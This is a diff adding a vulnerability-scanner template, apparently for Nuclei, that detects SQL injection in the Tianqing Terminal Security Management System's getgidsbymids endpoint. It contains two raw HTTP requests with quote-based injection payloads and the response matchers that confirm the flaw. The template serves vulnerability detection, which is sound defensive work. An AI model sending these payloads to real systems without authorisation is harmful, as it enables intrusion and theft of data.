@@ -1,0 +1,41 @@
+id: tianqing-sql-injection
+
+info:
+  name: Tianqing Terminal Security Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There exists a SQL injection vulnerability in the /api/client/getgidsbymids endpoint of the Tianqing Terminal Security Management System.
+    Exploiting this vulnerability, attackers can retrieve sensitive information or achieve remote command execution.
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        GET /api/client/getgidsbymids?sign=6824fb5c045b6ab3062c6f3053d04dbb&t=123&mids=4131' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"result\":42601,\"reason\""
+        part: body
+
+  - raw:
+      - |
+        GET /api/client/getgidsbymids?sign=6824fb5c045b6ab3062c6f3053d04dbb&t=123&mids=4131'))%3b+--+aw HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"reason\":\"success\""
+        part: body
